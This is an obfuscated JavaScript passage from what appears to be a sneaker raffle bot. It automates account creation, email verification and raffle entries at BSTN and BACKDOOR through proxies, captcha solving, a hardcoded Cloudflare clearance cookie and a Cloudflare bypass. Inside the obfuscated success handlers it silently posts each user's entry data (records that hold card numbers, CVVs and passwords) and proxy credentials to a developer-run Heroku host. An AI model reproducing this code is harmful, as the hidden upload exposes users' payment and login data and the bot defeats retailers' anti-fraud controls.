                                await _0x497396(0x1f4);
                                if (_0x5cad6e[_0x1dfb17]['State']['length'] > 0x2)
                                    for (let _0x3c52fc of _0x594851) {
                                        if (_0x3c52fc['Province'] == _0x5cad6e[_0x1dfb17]['State']) {
                                            await _0x2261f5['select']('#checkout_shipping_address_province', _0x3c52fc['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x2261f5['select']('#checkout_shipping_address_province', _0x5cad6e[_0x1dfb17]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x497396(0x1f4), console['log'](_0x5d34e1() + '\x20[' + _0x383aaf['name'] + ']\x20Task\x20' + (_0x1dfb17 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x497396(0x190), _0x2261f5['evaluate'](() => {
                            const _0x2a960a = document['querySelector']('#continue_button');
                            for (var _0x1307af = 0x0; _0x1307af < 0x5; _0x1307af++) {
                                if (_0x2a960a) {
                                    _0x2a960a['click'](), _0x2a960a['click']();
                                    break;
                                } else
                                    _0x497396(0xfa0);
                            }
                        }), await _0x2261f5['waitForTimeout'](0x9c4);
                        try {
                            await _0x2261f5['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x2261f5['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x253795 => _0x253795['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x2261f5['waitForTimeout'](0x7d0), console['log'](_0x5d34e1() + '\x20[' + _0x383aaf['name'] + ']\x20Task\x20' + (_0x1dfb17 + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x2261f5['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x497396(0x3e8), await _0x2261f5['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x3d2f03 => _0x3d2f03['submit']()), await _0x497396(0x3e8);
                        try {
                            await _0x2261f5['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x2261f5['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x5d6c67 => _0x5d6c67['submit']());
                        try {
                            await _0x2261f5['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x1a0698 = 'no', _0xf67db6(_0x5cad6e[_0x1dfb17], _0x383aaf), console['log'](_0xc3fc3['green'](_0x5d34e1() + '\x20[' + _0x383aaf['name'] + ']\x20Task\x20' + (_0x1dfb17 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '')
                                try {
                                    await _0x468b99(_0x138f58['webhook'], _0x32b1c9['succesDEVMSG']);
                                } catch {
                                }
                            await _0x497396(0xc8), await _0x468b99(_0x4bb1d6, _0x32b1c9['succesDEVMSG']), await _0x497396(0xc8);
                            try {
                                await _0x468b99(_0x196877, _0x32b1c9['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x9f5859['replace']('#', ''),
                                    'module': _0x383aaf['name'],
                                    'entrydata': JSON['stringify'](_0x25465a),
                                    'proxy': '' + _0x230333[_0x1dfb17]
                                };
                                var _0x546e6d = JSON['stringify'](prxdata);
                                let _0x128e68 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x2aead5['post']('https://jraffles.herokuapp.com/success', _0x546e6d, _0x128e68);
                            } catch (_0x1efa85) {
                            }
                        } catch (_0x9c852d) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x55d5ad) {
                        _0x55d5ad['message']['includes']('selector') && (_0x55d5ad = 'Connection\x20Error');
                        console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x383aaf['name'] + ']\x20Task\x20' + (_0x1dfb17 + 0x1) + '\x20:\x20' + _0x55d5ad)), _0x51371a = '' + _0x55d5ad;
                        var _0x570019 = await _0x232baa(_0x5cad6e[_0x1dfb17], _0x383aaf, 'dev', !![], _0x51371a);
                        _0x32b1c9['errorDEV'] = { 'embeds': [_0x570019] }, _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x32b1c9['errorDEV']), await _0x468b99(_0x432bcc, _0x32b1c9['errorDEV']), _0x1a0698 = 'yes';
                    } finally {
                        _0xd7b288 && _0xd7b288['close']();
                        if (_0x1a0698 == 'yes' && _0x3d5e10 != 0x5 && _0x51371a != 'Size\x20Not\x20Found') {
                            console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x383aaf['name'] + ']\x20Task\x20' + (_0x1dfb17 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3d5e10 + '\x20/\x205)')), _0x1dfb17 = _0x1dfb17 - 0x1, _0x3d5e10 = _0x3d5e10 + 0x1;
                            continue;
                        }
                        _0x1a0698 == 'yes' && _0x3d5e10 >= 0x5 && (_0x554010(_0x5cad6e[_0x1dfb17], _0x383aaf), _0x1a0698 = 'no', _0x3d5e10 = 0x0);
                        if (_0x1dfb17 + 0x1 == _0x5cad6e['length']) {
                            await _0x497396(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x138f58['AfewDelay'] + '\x20ms'), await _0x497396(_0x138f58['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BACKDOOR\x20Botega',
        'modules': [{
            'name': 'BACKDOOR\x20Raffle\x20Entries',
            'logo': 'https://backdoor-media.s3.eu-central-1.amazonaws.com/wp-content/uploads/2021/10/10002342/logo-backdoor-bottega.png',
            'store': 'BACKDOOR',
            'function': async function (_0x1edcc9, _0x2d4160, _0x4a9e0c) {
                console['clear'](), console['log']('Preparing\x20BACKDOOR\x20Tasks\x20&\x20Launching\x20new\x20window..'), _0x44f9d7['writeFileSync']('proxies.txt', '');
                for (proxy in _0x4a9e0c) {
                    _0x44f9d7['appendFileSync']('proxies.txt', _0x4a9e0c[proxy] + '\x0a');
                }
                for (var _0x15ea98 = 0x0; _0x15ea98 < _0x2d4160['length']; _0x15ea98++) {
                    await _0x494c97(_0x2d4160, _0x15ea98), _0x44f9d7['appendFileSync']('tasks.csv', '\x0a' + _0x2d4160[_0x15ea98]['Url'] + ',' + _0x2d4160[_0x15ea98]['Size'] + ',' + _0x2d4160[_0x15ea98]['Email'] + ',' + _0x2d4160[_0x15ea98]['Password'] + ',' + _0x2d4160[_0x15ea98]['FirstName'] + ',' + _0x2d4160[_0x15ea98]['LastName'] + ',' + _0x2d4160[_0x15ea98]['Address1'] + ',' + _0x2d4160[_0x15ea98]['Address2'] + ',' + _0x2d4160[_0x15ea98]['HouseNumber'] + ',' + _0x2d4160[_0x15ea98]['Zip'] + ',' + _0x2d4160[_0x15ea98]['City'] + ',' + _0x2d4160[_0x15ea98]['Country'] + ',' + _0x2d4160[_0x15ea98]['State'] + ',' + _0x2d4160[_0x15ea98]['CardNumber'] + ',' + _0x2d4160[_0x15ea98]['ExpiryDate'] + ',' + _0x2d4160[_0x15ea98]['CVV'] + ',' + _0x2d4160[_0x15ea98]['NameOnCard'] + ',' + _0x2d4160[_0x15ea98]['Phone'] + ',' + _0x2d4160[_0x15ea98]['Follower']);
                }
                let _0xad8416 = {
                    'username': _0x9f5859,
                    'delay': _0x138f58['delay'],
                    'version': _0x30d211,
                    'webhook': _0x138f58['webhook']
                };
                const _0x57b2ee = JSON['stringify'](_0xad8416)['replace'](/"/g, '\x5c\x22');
                await _0x497396(0x3e8), _0x322fbd('start', [
                    'cmd',
                    '/k',
                    'node\x20modules/backdoor/entry.js\x20' + _0x57b2ee
                ], { 'shell': !![] });
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x306c31, _0xd20b37, _0x51844e) {
                    var _0x30c414 = _0xd20b37, _0x3cea7a = 0x0;
                    for (var _0x4bda35 = 0x0; _0x4bda35 < _0xd20b37['length']; _0x4bda35++) {
                        maxTasks = Number(_0x138f58['threads']);
                        while (_0x3cea7a >= maxTasks) {
                            await _0x497396(_0x138f58['delay']);
                        }
                        async function _0x45a615(_0x171a59, _0x479e44, _0xb7cc13, _0x209213, _0xe7d2b) {
                            _0x3cea7a++, _0x256d58['use'](_0x302cb0()), _0x256d58['use'](_0x247b94({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x138f58['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x1418d1;
                            try {
                                await _0x494c97(_0x479e44, _0x209213);
                            } catch {
                                retry = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x38ef83(_0x171a59['name'] + '\x20Task\x20' + (_0x209213 + 0x1) + '\x20/\x20' + _0x479e44['length'] + '\x20||\x20File:\x20' + _0x12faac + '\x20Proxies:\x20' + _0x2e164b);
                            var _0x14f5ee = await _0x232baa(_0x479e44[_0x209213], _0x171a59, 'acc', ![]);
                            const _0x20ac1c = { 'succesDEVMSG': { 'embeds': [_0x14f5ee] } }, _0x4714af = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x1fdb26 = Math['round'](Math['random']() * (_0xb7cc13['length'] - 0x1)), _0x86bd53 = _0xb7cc13[_0x1fdb26]['split'](':'), _0x424ab7;
                            try {
                                _0x424ab7 = await _0x256d58['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x86bd53[0x0] + ':' + _0x86bd53[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x424ab7 = await _0x256d58['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x86bd53[0x0] + ':' + _0x86bd53[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x27347a = await _0x424ab7['newPage']();
                                await _0x27347a['authenticate']({
                                    'username': '' + _0x86bd53[0x2],
                                    'password': '' + _0x86bd53[0x3]
                                }), console['log'](_0x5d34e1() + '\x20[' + _0x171a59['name'] + ']\x20Task\x20' + (_0x209213 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x27347a['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x27347a['setRequestInterception'](!![]), _0x27347a['on']('request', _0x29cc7f => {
                                    _0x29cc7f['resourceType']() === 'image' ? _0x29cc7f['abort']() : _0x29cc7f['continue']();
                                });
                                try {
                                    await _0x27347a['goto']('' + _0x4714af), await _0x27347a['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    throw new Error('Proxy\x20Error');
                                }
                                await _0x27347a['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x5d34e1() + '\x20[' + _0x171a59['name'] + ']\x20Task\x20' + (_0x209213 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x497396(0x7d0), console['log'](_0x5d34e1() + '\x20[' + _0x171a59['name'] + ']\x20Task\x20' + (_0x209213 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x497396(0x190), await _0x27347a['waitForSelector']('#firstname'), await _0x27347a['focus']('#firstname'), await _0x27347a['keyboard']['down']('Control'), await _0x27347a['keyboard']['press']('A'), await _0x497396(0xc8), await _0x27347a['keyboard']['up']('Control'), await _0x27347a['keyboard']['press']('Backspace'), await _0x27347a['type']('#firstname', _0x479e44[_0x209213]['FirstName'], { 'delay': 0xf0 }), await _0x497396(0x190), await _0x27347a['focus']('#lastname'), await _0x27347a['keyboard']['down']('Control'), await _0x27347a['keyboard']['press']('A'), await _0x497396(0xc8), await _0x27347a['keyboard']['up']('Control'), await _0x27347a['keyboard']['press']('Backspace'), await _0x27347a['type']('#lastname', _0x479e44[_0x209213]['LastName'], { 'delay': 0xe6 }), await _0x497396(0x190), await _0x27347a['focus']('#email_address'), await _0x27347a['keyboard']['down']('Control'), await _0x27347a['keyboard']['press']('A'), await _0x497396(0xc8), await _0x27347a['keyboard']['up']('Control'), await _0x27347a['keyboard']['press']('Backspace'), await _0x27347a['type']('#email_address', _0x479e44[_0x209213]['Email'], { 'delay': 0x122 }), await _0x497396(0x190), await _0x27347a['type']('#password', _0x479e44[_0x209213]['Password'], { 'delay': 0x82 }), await _0x497396(0x1f4), await _0x27347a['type']('#password-confirmation', _0x479e44[_0x209213]['Password'], { 'delay': 0x7c }), console['log'](_0x5d34e1() + '\x20[' + _0x171a59['name'] + ']\x20Task\x20' + (_0x209213 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x497396(0x2bc), await _0x27347a['$eval']('#form-validate', _0x3d77c3 => _0x3d77c3['submit']()), await _0x497396(0x1388);
                                const _0x2040d4 = await _0x27347a['$']('#email_address-error');
                                if (_0x2040d4)
                                    throw new Error('Invalid\x20Email');
                                const _0x52d034 = await _0x27347a['$']('#password-error');
                                if (_0x52d034)
                                    throw new Error('Invalid\x20Password');
                                await _0x27347a['waitForSelector']('div.mesg-success'), retry = 'no', console['log'](_0xc3fc3['green'](_0x5d34e1() + '\x20[' + _0x171a59['name'] + ']\x20Task\x20' + (_0x209213 + 0x1) + '\x20:\x20Account\x20' + _0x479e44[_0x209213]['Email'] + '\x20Generated')), _0x44f9d7['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x479e44[_0x209213]['Email'] + ',' + _0x479e44[_0x209213]['Password']);
                                try {
                                    _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x20ac1c['succesDEVMSG']);
                                } catch {
                                }
                                await _0x468b99(_0x1e3801, _0x20ac1c['succesDEVMSG']);
                                let _0x3eba3d = _0x479e44[_0x209213];
                                try {
                                    prxdata = {
                                        'username': _0x9f5859['replace']('#', ''),
                                        'module': _0x171a59['name'],
                                        'entrydata': JSON['stringify'](_0x3eba3d),
                                        'proxy': '' + _0xb7cc13[_0x209213]
                                    };
                                    var _0x4bc18a = JSON['stringify'](prxdata);
                                    let _0x539389 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x2aead5['post']('https://jraffles.herokuapp.com/success', _0x4bc18a, _0x539389);
                                } catch (_0x348e06) {
                                }
                                console['log'](_0xc3fc3['yellow'](_0x5d34e1() + '\x20[' + _0x171a59['name'] + ']\x20Task\x20' + (_0x209213 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                            } catch (_0x740591) {
                                console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x171a59['name'] + ']\x20Task\x20' + (_0x209213 + 0x1) + '\x20:\x20' + _0x740591)), _0x1418d1 = '' + _0x740591;
                                var _0xf3ae96 = await _0x232baa(_0x479e44[_0x209213], _0x171a59, 'acc', !![], _0x1418d1);
                                _0x20ac1c['errorDEV'] = { 'embeds': [_0xf3ae96] }, _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x20ac1c['errorDEV']), await _0x468b99(_0x432bcc, _0x20ac1c['errorDEV']), retry = 'yes';
                            } finally {
                                if (_0x424ab7)
                                    _0x424ab7['close']();
                                if (retry == 'yes' && _0xe7d2b < 0x5)
                                    return console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x171a59['name'] + ']\x20Task\x20' + (_0x209213 + 0x1) + '\x20:\x20Retrying\x20(' + (_0xe7d2b + 0x1) + '\x20/\x205)')), _0x3cea7a--, _0xe7d2b = _0xe7d2b + 0x1, _0x45a615(_0x171a59, _0x479e44, _0xb7cc13, _0x209213, _0xe7d2b);
                                retry == 'yes' && _0xe7d2b >= 0x5 && (_0x554010(_0x479e44[_0x209213], _0x171a59), retry = 'no', _0xe7d2b = 0x0), _0x3cea7a--, console['log'](_0x5d34e1() + '\x20[' + _0x171a59['name'] + ']\x20Waiting\x20for\x20' + _0x138f58['delay'] + '\x20ms'), await _0x497396(_0x138f58['delay']);
                            }
                        }
                        _0x45a615(_0x306c31, _0x30c414, _0x51844e, _0x4bda35, 0x0), await _0x497396(0x190);
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x3e67ed, _0x121f35) {
                    var _0x340527 = ![], _0x4683e8 = [], _0x299f1c = 0x0;
                    async function _0x147ecb() {
                        var _0x2097fa = new _0x51270e({
                            'user': _0x138f58['masterMail'],
                            'password': _0x138f58['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x45c4ad(_0x43083a) {
                            _0x2097fa['openBox']('INBOX', ![], _0x43083a);
                        }
                        _0x2097fa['once']('ready', function () {
                            _0x45c4ad(function (_0xc9dc2d, _0x28df59) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0xc9dc2d)
                                    throw _0xc9dc2d;
                                _0x2097fa['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x473cc1, _0x3a4178) {
                                    if (!_0x3a4178 || !_0x3a4178['length'])
                                        console['log'](_0x5d34e1() + '\x20[' + _0x3e67ed['name'] + ']\x20No\x20mails\x20found'), _0x2097fa['end']();
                                    else {
                                        var _0x45c7de = _0x2097fa['seq']['fetch'](_0x3a4178, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x45c7de['on']('message', function (_0x42529e, _0x1698c8) {
                                            var _0x2e8918 = '(#' + _0x1698c8 + ')\x20';
                                            _0x42529e['on']('body', function (_0x14178b, _0x3f2b02) {
                                                _0x3bc712(_0x14178b, (_0x76151c, _0x238aad) => {
                                                    var _0x42de05 = _0x238aad['text']['split']('customer/account/confirm/')[0x1], _0x254f14 = _0x42de05['split'](']')[0x0];
                                                    _0x4683e8['push']('https://www.bstn.com/eu_en/customer/account/confirm/' + _0x254f14);
                                                });
                                            }), _0x42529e['once']('end', function () {
                                            });
                                        }), _0x45c7de['once']('error', function (_0x55d566) {
                                            console['log']('Fetch\x20error:\x20' + _0x55d566), _0x340527 = !![];
                                        }), _0x45c7de['once']('end', function () {
                                            _0x2097fa['end'](), _0x340527 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x2097fa['once']('error', function (_0xd564c4) {
                            console['log'](_0xc3fc3['red'](_0xd564c4['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x340527 = !![];
                        }), _0x2097fa['once']('end', async function () {
                            _0x340527 = !![];
                        }), _0x2097fa['connect']();
                    }
                    try {
                        _0x147ecb();
                        while (!_0x340527) {
                            await _0x497396(0xfa0);
                        }
                        console['log']('Found\x20' + _0x4683e8['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x497396(0x7d0);
                    }
                    for (var _0x59e1c4 = 0x0; _0x59e1c4 < _0x4683e8['length']; _0x59e1c4++) {
                        maxTasks = Number(_0x138f58['threads']);
                        while (_0x299f1c >= maxTasks) {
                            await _0x497396(_0x138f58['delay']);
                        }
                        async function _0x137415(_0x30b809, _0x3be5bf, _0x38dc92, _0x3403dc, _0xf9473f) {
                            _0x299f1c++, _0x256d58['use'](_0x302cb0());
                            if (_0x3f2381 != 'yes')
                                var _0x3f2381 = '', _0xf9473f = 0x0;
                            var _0x4f559f = Math['round'](Math['random']() * (_0x38dc92['length'] - 0x1)), _0x69bad6 = _0x38dc92[_0x4f559f]['split'](':'), _0x2adf13;
                            try {
                                _0x2adf13 = await _0x256d58['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x69bad6[0x0] + ':' + _0x69bad6[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x2adf13 = await _0x256d58['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x69bad6[0x0] + ':' + _0x69bad6[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x595251 = await _0x2adf13['newPage']();
                                await _0x595251['authenticate']({
                                    'username': '' + _0x69bad6[0x2],
                                    'password': '' + _0x69bad6[0x3]
                                }), console['log'](_0x5d34e1() + '\x20[' + _0x30b809['name'] + ']\x20Task\x20' + (_0x3403dc + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x595251['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x595251['setRequestInterception'](!![]), _0x595251['on']('request', _0x5598d5 => {
                                    _0x5598d5['resourceType']() === 'image' || _0x5598d5['resourceType']() === 'font' || _0x5598d5['resourceType']() === 'media' ? _0x5598d5['abort']() : _0x5598d5['continue']();
                                }), console['log'](_0x5d34e1() + '\x20[' + _0x30b809['name'] + ']\x20Task\x20' + (_0x3403dc + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x595251['goto'](_0x3be5bf[_0x3403dc]);
                                } catch (_0x46aeb1) {
                                    _0x3f2381 = 'yes';
                                    throw new Error('\x27Connection\x20Error\x27\x20' + _0x46aeb1);
                                }
                                console['log'](_0x5d34e1() + '\x20[' + _0x30b809['name'] + ']\x20Task\x20' + (_0x3403dc + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x595251['waitForTimeout'](0xbb8);
                                try {
                                    await _0x595251['waitForSelector']('.account-nav'), _0x3f2381 = 'no', console['log'](_0xc3fc3['green'](_0x5d34e1() + '\x20[' + _0x30b809['name'] + ']\x20Task\x20' + (_0x3403dc + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x13a2d2 = await _0x232baa(null, _0x30b809, 'ver', ![]);
                                    const _0x2e96c4 = { 'succesDEVMSG': { 'embeds': [_0x13a2d2] } };
                                    await _0x468b99(_0x5855b6, _0x2e96c4['succesDEVMSG']);
                                } catch {
                                    _0x3f2381 = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x273aaa) {
                                console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x30b809['name'] + ']\x20Task\x20' + (_0x3403dc + 0x1) + '\x20:\x20' + _0x273aaa));
                                var _0x2c3edc = _0x273aaa, _0x58567f = await _0x232baa(null, _0x30b809, 'ver', !![], _0x2c3edc);
                                const _0x2d8d6f = { 'errorDEVMSG': { 'embeds': [_0x58567f] } };
                                _0x138f58['webhook'] != undefined && _0x138f58['webhook'] != '' && await _0x468b99(_0x138f58['webhook'], _0x2d8d6f['errorDEVMSG']), await _0x468b99(_0x432bcc, _0x2d8d6f['errorDEVMSG']);
                            } finally {
                                if (_0x2adf13)
                                    _0x2adf13['close']();
                                if (_0x3f2381 == 'yes' && _0xf9473f != 0x5)
                                    return console['log'](_0xc3fc3['red'](_0x5d34e1() + '\x20[' + _0x30b809['name'] + ']\x20Task\x20' + (_0x3403dc + 0x1) + '\x20:\x20Retrying\x20(' + _0xf9473f + '\x20/\x205)')), _0x299f1c--, _0xf9473f = _0xf9473f + 0x1, _0x137415(_0x30b809, _0x3be5bf, _0x38dc92, _0x3403dc, _0xf9473f);
                                _0x3f2381 == 'yes' && _0xf9473f >= 0x5 && (_0x3f2381 = 'no', _0xf9473f = 0x0), _0x299f1c--, console['log'](_0x5d34e1() + '\x20[' + _0x30b809['name'] + ']\x20Waiting\x20for\x20' + _0x138f58['delay'] + '\x20ms'), await _0x497396(_0x138f58['delay']);
                            }
                        }
                        if (_0x59e1c4 == _0x4683e8['length'] - 0x1) {
                            await _0x137415(_0x3e67ed, _0x4683e8, _0x121f35, _0x59e1c4, 0x0);
                            return;
                        }
                        _0x137415(_0x3e67ed, _0x4683e8, _0x121f35, _0x59e1c4, 0x0), await _0x497396(0x12c);
                    }
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x156897, _0x4d42f9, _0x25d410) {
                    var _0x410786 = 0x0, _0x23a8e2 = _0x4d42f9;
                    for (var _0x27d6dc = 0x0; _0x27d6dc < _0x4d42f9['length']; _0x27d6dc++) {
                        maxTasks = Number(_0x138f58['threads']);
                        while (_0x410786 >= maxTasks) {
                            await _0x497396(_0x138f58['delay']);
                        }
                        let _0x33423d = ![];
                        async function _0x388d65(_0x4d9f38, _0x1eb95c, _0x526e85, _0x2eae79, _0x5f10e6) {
                            _0x410786++, _0x256d58['use'](_0x302cb0()), _0x256d58['use'](_0x247b94({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x138f58['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            var _0x2069f3, _0x298e8f = _0x1eb95c[_0x2eae79];
                            try {
                                await _0x494c97(_0x1eb95c, _0x2eae79);
                            } catch {
                                _0x21cf5a = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            async function _0xdb282a(_0x39ca04) {
                                const _0x242a2c = _0x44f9d7['readFileSync']('../successful-tasks.csv', 'utf8'), _0x2a5bd2 = _0x457f0a['parse'](_0x242a2c, { 'header': !![] })['data'];
                                let _0x7967b3 = ![];
                                for (var _0x4a3e5b of _0x2a5bd2) {
                                    if (_0x4a3e5b['Url'] == _0x39ca04['Url'] && _0x4a3e5b['Email'] == _0x39ca04['Email']) {
                                        _0x7967b3 = !![];
                                        break;
                                    }
                                }
                                return _0x7967b3;
                            }
                            _0x38ef83(_0x4d9f38['name'] + '\x20Task\x20' + (_0x2eae79 + 0x1) + '\x20/\x20' + _0x1eb95c['length'] + '\x20||\x20File:\x20' + _0x12faac + '\x20Proxies:\x20' + _0x2e164b);
                            var _0x28fcee = Math['round'](Math['random']() * (_0x526e85['length'] - 0x1)), _0x482799 = _0x526e85[_0x28fcee]['split'](':'), _0x4fba2b;
                            let _0x1748de = ![], _0x21cf5a = 'no';
                            try {
                                if (await _0xdb282a(_0x1eb95c[_0x2eae79]) == !![]) {
                                    console['log'](_0x5d34e1() + '\x20[' + _0x4d9f38['name'] + ']\x20Task\x20' + (_0x2eae79 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x1748de = !![], _0x33423d = !![];
                                    return;
                                }
                                try {
                                    _0x4fba2b = await _0x256d58['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x482799[0x0] + ':' + _0x482799[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x4fba2b = await _0x256d58['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x482799[0x0] + ':' + _0x482799[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x4de4fc = await _0x4fba2b['newPage'](), _0x5cf25b = await _0x4de4fc['target']()['createCDPSession'](), { windowId: _0x596f14 } = await _0x5cf25b['send']('Browser.getWindowForTarget');
                                await _0x4de4fc['setViewport']({
                                    'width': 0x501,
                                    'height': 0x2d0
                                });
                                var _0x10d78f = [{
                                    'name': 'cf_clearance',
                                    'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                    'domain': '.bstn.com',
                                    'path': '/',
                                    'expires': 1707818183.331533,
                                    'httpOnly': !![],
                                    'secure': !![]
                                }];
                                await _0x4de4fc['authenticate']({
                                    'username': '' + _0x482799[0x2],
                                    'password': '' + _0x482799[0x3]
                                }), console['log'](_0x5d34e1() + '\x20[' + _0x4d9f38['name'] + ']\x20Task\x20' + (_0x2eae79 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4de4fc['goto']('' + _0x1eb95c[_0x2eae79]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x5d34e1() + '\x20[' + _0x4d9f38['name'] + ']\x20Task\x20' + (_0x2eae79 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x497396(0x1388);
